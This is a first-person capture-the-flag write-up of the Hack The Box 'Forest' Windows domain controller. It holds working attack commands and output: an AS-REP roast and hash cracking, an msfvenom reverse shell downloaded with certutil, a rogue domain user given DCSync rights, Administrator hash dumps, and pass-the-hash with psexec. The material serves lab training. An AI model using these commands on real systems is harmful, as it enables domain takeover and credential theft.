---
title: Hack The Box - Forest
date: 2020-03-22 08:38:00 +0800
categories: [hackthebox]
tags: [ldap, kerberos, windows]
image:
    path: /assets/images/forest.png
---
This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience!

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.161 forest.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sV -sT -sC forest.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 08:19 EDT
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 55.65% done; ETC: 08:19 (0:00:08 remaining)
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.26s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-19 12:27:20Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=10/19%Time=5DAAFF64%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\xdir
1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03")%r(HTTPOptions,2A,"\0\(m\xd1\x81\x82\0\x01\0\0\
SF:0\0\0\x01\0\0\x02\0\x01\0\0\)\x0f\xa0\0\0\0\0\0\x0c\0\n\0\x08\xbd<\.\x1
SF:b\x9d\x91\xc8`");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m37s, deviation: 4h02m31s, median: 7m36s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-19T05:29:41-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-19 08:29:43
|_  start_date: 2019-10-19 06:16:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 285.63 seconds
```

# Enumeration (1)

Seems like an Active Directory Domain Controller. Where do we start ? @.@ 

According to the `nmap`'s host script results, we see the actual domain name of the box is `htb.local` so lets modify `/etc/hosts` to include it as well.

```bash
$ cat /etc/hosts
...
10.10.10.161 forest.htb htb.local
```

Seeing that there might be a `DNS` server running on port 53, lets try to use `dig` on it.

```bash
$ dig axfr htb.local @10.10.10.161

; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr htb.local @10.10.10.161
;; global options: +cmd
; Transfer failed.
```

Nothing :( `LDAP` is running on port `389` so lets check that out using `ldapsearch`.

```bash
$ ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
...
```

I'm not sure what to look for but let's first look at what users we can find? I wasn't familiar with how `LDAP` queries work so I decided to use another tool [`windapsearch`](https://github.com/ropnop/windapsearch) to simplify the job.

```bash
python windapsearch.py -d htb.local -U
[+] No username provided. Will try anonymous bind.
[+] No DC IP provided. Will try to discover via DNS lookup.
[+] Using Domain Controller at: 10.10.10.161
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 28 users: 

...

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local


[*] Bye!
```

Nice! We found 5 usernames to play with! But what exactly can we do with them?

Seeing that there is `Kerberos` running on port `88`, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this [article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/), lets see if we can perform the `ASREPRoast` attack using `impacket`'s [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) while specifying the 5 usernames we found.

```bash
$ cat users.txt
sebastien
lucinda
andy
mark
santi

$ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Looks like we didn't manage to get any hashes... 

At this point, I wasn't sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 6? How was I missing a username? 

Inside of `impacket`'s collection of scripts, there was a file called [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py) which seemed hopeful.

```bash
$ GetADUsers.py -all htb.local/
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[*] Querying htb.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@htb.local         2019-09-18 13:09:08.342879  2019-10-07 06:57:07.299606 
Guest                                                 <never>                     <never>             
DefaultAccount                                        <never>                     <never>             
krbtgt                                                2019-09-18 06:53:23.467452  <never>             
$331000-VK4ADACQNUCA                                  <never>                     <never>             
...          
sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
lucinda                                               2019-09-19 20:44:13.233891  <never>             
svc-alfresco                                          2019-11-16 07:54:12.200875  2019-11-16 07:52:19.754834 
andy                                                  2019-09-22 18:44:16.291082  <never>             
mark                                                  2019-09-20 18:57:30.243568  <never>             
santi                                                 2019-09-20 19:02:55.134828  <never> 
```

There it is! The 6th username is `svc-alfresco`. But I wonder why did the username not appear in our `LDAP` search results just now?

After appending the username to the list of usernames, we performed the `ASREPRoast` attack again.

```bash
$ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

$ cat hashes.asreproast
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229
```

Great! We are back on track! We then cracked the hash using `john`.
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2019-10-26 03:10) 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

With `svc-alfresco:s3rvice`, I tried enumerating for `SMB` shares using `smbmap` but found nothing :(
```bash
smbmap -H htb.local -u svc-alfresco -p s3rvice
[+] Finding open SMB ports....
[+] User SMB session establishd on htb.local...
[+] IP: htb.local:445	Name: htb.local                                         
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	NETLOGON                                          	READ ONLY
	SYSVOL                                            	READ ONLY
```

With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535.

```bash
$ nmap -sS -p 1-65535 htb.local
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 08:40 EST
Nmap scan report for htb.local (10.10.10.161)
Host is up (0.25s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49698/tcp open  unknown
49708/tcp open  unknown
```

I now see a possible entry point, which is port `5985` that is used by the `WinRM` service for remote management of Windows systems. Lets see if we can establish a shell using `Alamot`'s [`winrm_shell.rb`](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'http://htb.local:5985/wsman',
  transport: :ssl,
  user: 'htb.local\svc-alfresco',
  password: 's3rvice',
  :no_ssl_peer_verification => true
)
...
```

# user.txt

```bash
$ ruby winrm_shell.rb
PS htb\svc-alfresco@FOREST Documents> whoami
htb\svc-alfresco
```

We finally got in! Now, to grab the user flag.
```powershell
PS htb\svc-alfresco@FOREST Documents> cd ../Desktop
PS htb\svc-alfresco@FOREST Desktop> more user.txt
e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

This was where I really got lost and I had to turn to the forums for more hints.

Many mentioned about some "dog" but I guess they were referring to [`BloodHound`](https://github.com/BloodHoundAD/BloodHound). 

```
BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor.

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
```

When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor ([`SharpHound`](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe)) to run on the system, I first need to upgrade my current `WinRM` shell to a `meterpreter` shell.

First, I generate my reverse shell executable using `msfvenom` and start our reverse shell listener.
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes

$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.XX.XX
LHOST => 10.10.XX.XX
msf5 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.XX.XX:1337
```

And then start a web server using the builtin `SimpleHTTPServer` module in `python`
```bash
$ mkdir httpserver
$ cd httpserver
$ cp ~/shell.exe .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

In our previous `WinRM` shell still hopefully connected,
```
PS htb\svc-alfresco@FOREST Documents> certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

PS htb\svc-alfresco@FOREST Documents>./shell.exe
```

```
[*] Sending stage (179779 bytes) to 10.10.10.161
[*] Meterpreter session 1 opened (10.10.XX.XX:1337 -> 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500

meterpreter >
```

Next up, we upload `SharpHound.ps1` to the box and run it.
```
meterpreter > upload SharpHound.ps1 .
[*] uploading  : SharpHound.ps1 -> .
[*] uploaded   : SharpHound.ps1 -> .\SharpHound.ps1
meterpeter > shell
Process 2476 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-alfresco\Documents> powershell
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
Import-Module .\SharpHound.ps1
PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
Initializing BloodHound at 8:42 AM on 11/16/2019
Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
Starting Enumeration for htb.local
Status: 124 objects enumerated (+124 41.33333/s --- Using 70 MB RAM )
Finished enumeration for htb.local in 00:00:03.7645465
1 hosts failed ping. 0 hosts timedout.

Compressing data to C:\Users\svc-alfresco\Documents\20191116084214_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!
```

And now to retrieve the compressed file back to our system.
```
PS C:\Users\svc-alfresco\Documents> exit
C:\Users\svc-alfresco\Documents> exit
meterpreter > download 20191116084214_BloodHound.zip
[*] downloading  : 20191116084214_BloodHound.zip. -> /root/Desktop
[*] downloaded   : 20191116084214_BloodHound.zip. -> /root/Desktop/20191116084214_BloodHound.zip
```

And now the moment you have been waiting for, witness the capabilities of `BloodHound`! 
There are actually 2 ways to run `BloodHound`, first being running it on your own system and secondly being running it in a `Docker` container. Since it is extremely troublesome to set up, I will be using this image [`belane/bloodhound`](https://github.com/belane/docker-bloodhound).

```bash
$ docker run -it \
-p 7474:7474 \
-e DISPLAY=unix$DISPLAY \
-v /tmp/.X11-unix:/tmp/.X11-unix \
--device=/dev/dri:/dev/dri \
--name bloodhound belane/bloodhound
```

What you will notice is that a window will automatically be opened and `BloodHound` is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. `BloodHound` actually supports drag and drop but for some reason it was not working so we need to use `docker cp` to get the data in.

```bash
$ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip
```

Then from the interface, click on `Upload Data` on the right side, select the file and hit `Open`. It will take a while for `BloodHound` to populate its database.

![](/assets/images/forest1.png)

I won't go through all the features of `BloodHound`, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently `svc-alfresco` and are attempting to escalate to the `Administrator` account, we will set `svc-alfresco@htb.local` as the Start Node and `Administrator@htb.local` as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding.

![](/assets/images/forest2.png)

As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between `EXCHANGE WINDOWS PERMISSION@HTB.LOCAL` and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the `WriteDacl` privilege will be given.

```
The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
```

According to this [post](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/), the `WriteDacl` privilege allows us to perform `DCSync` operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL`.

# Exploitation

First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which is a module that I use that contains many useful `Powershell` commands for offensive operations.

```
meterpreter > upload /root/Downloads/PowerView.ps1 .
[*] uploading  : /root/Downloads/PowerView.ps1 -> .
[*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
```

Back to the powershell shell, we will import it in.
```powershell
Import-Module .\PowerView.ps1
```

Next we will create a new user and add him to the `EXCHANGE WINDOWS PERMISSIONS` group.
```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
```

![](/assets/images/forest3.png)

According to this picture from the earlier post, we will need to run `ntlmrelayx` on our machine.
```bash
$ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```

With that done, we need to get the `Exchange` Server to perform `NTLM` authentication to us over `HTTP`. However, there is no `Exchange` server running on the box! Since we already have a user in the `EXCHANGE WINDOWS PERMISSIONS` group, we can simply use our own browser to do the authentication.

Opening any browser, we browse to `http://localhost/privexchange`. We will then be prompted for credentials, where we enter those of our newly created user and hit `OK`.

Back on our `ntlmrelayx`, we see that our new user has gotten the necessary privileges to perform `DCSync` operations!

```bash
*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Client requested path: /privexchange
[*] Authenticating against ldap://htb.local as \rizemon SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20191229-070933.restore
```

And now the last step is to obtain the hash for the domain administrator account using `impacket`'s [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py).

```bash
$ python secretsdump.py 'htb.local/rizemon:Password123!@htb.local' -just-dc
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...
```

# root.txt (1)

Using `impacket`'s [`psexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) and the hashes we got, we can remotely login to the box as Administrator.

```bash
$ psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file NKMskQmQ.exe
[*] Opening SVCManager on htb.local.....
[*] Creating service IHWO on htb.local.....
[*] Starting service IHWO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# root.txt(2)

First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which contains the commands needed for our exploit. 

```
meterpreter > upload /root/Downloads/PowerView.ps1 .
[*] uploading  : /root/Downloads/PowerView.ps1 -> .
[*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
```

Back to the powershell shell, we will import it in.
```powershell
Import-Module .\PowerView.ps1
```

Next we will create a new user and add him to the `EXCHANGE WINDOWS PERMISSIONS` group.
```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
```

With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the `Remote Management Users` group.
```powershell
Add-DomainGroupMember -Identity "Remote Management Users" -Members 'rizemon'
```

We then establish a shell using `Alamot`'s [`winrm_shell.rb`](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) and upgrade to a `meterpreter` shell.

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'http://htb.local:5985/wsman',
  transport: :ssl,
  user: 'htb.local\rizemon',
  password: 'Password123!',
  :no_ssl_peer_verification => true
)
...
```

```bash
$ ruby winrm_shell.rb
PS htb\rizemon@FOREST Documents> certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

PS htb\rizemon@FOREST Documents>./shell.exe
```

```
[*] Sending stage (179779 bytes) to 10.10.10.161
[*] Meterpreter session 1 opened (10.10.XX.XX:1337 -> 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500

meterpreter >
```

We are going to need [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) again as well as [`mimikatz`](https://github.com/gentilkiwi/mimikatz/releases), which is used to dump out the password hashes.

```
meterpreter > upload /root/Downloads/PowerView.ps1 .
[*] uploading  : /root/Downloads/PowerView.ps1 -> .
[*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
meterpreter > upload /root/Downloads/mimikatz.exe .
[*] uploading  : /root/Downloads/mimikatz.exe -> .
[*] uploaded   : /root/Downloads/mimikatz.exe -> .\mimikatz.exe
```

To dump out the hashes, the new user will need the `DCSync` privileges, which consist of the `DS-Replication-Get-Changes`,  `DS-Replication-Get-Changes-All` and `Replicating Directory Changes In Filtered Set` rights. More can be learnt from [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync). Fortunately, we can use the `Add-DomainObjectAcl` function to add all 3 privilges for us using the `-Rights DCSync` option.

```powershell
meterpreter > shell
Process 1224 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\rizemon\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\peter1\Documents>Import-Module ./PowerView.ps1
Import-Module ./PowerView.ps1
PS C:\Users\peter1\Documents> Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync
Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync
```

And finally, we dump out the hashes.
```
PS C:\Users\rizemon\Documents> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator
[DC] 'htb.local' will be the domain
[DC] 'FOREST.htb.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@htb.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 9/18/2019 9:09:08 AM
Object Security ID   : S-1-5-21-3072663084-364016917-1341370565-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
```

Using `impacket`'s [`psexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) and the hash we got, we can remotely login to the box as Administrator.

```bash
$ psexec.py Administrator@htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file NKMskQmQ.exe
[*] Opening SVCManager on htb.local.....
[*] Creating service IHWO on htb.local.....
[*] Starting service IHWO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !
